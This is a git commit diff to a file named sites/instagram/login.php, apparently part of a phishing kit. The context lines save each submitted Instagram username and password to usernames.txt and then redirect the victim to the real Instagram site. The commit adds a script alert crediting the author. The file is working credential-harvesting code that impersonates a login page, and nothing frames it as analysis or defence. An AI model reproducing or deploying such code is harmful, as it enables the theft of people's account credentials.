1e3ab08e938429dc5bc5e48de73b06068cf9ed89
Aijazmakerb <72906651+Aijazmakerb@users.noreply.github.com>
2021-03-14 11:09:31 +0530

    Update login.php

--- sites/instagram/login.php
+++ sites/instagram/login.php
@@ -2,5 +2,6 @@
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
+echo '<script>alert("Script created by Aijaz")</script>';
 exit();
 ?>
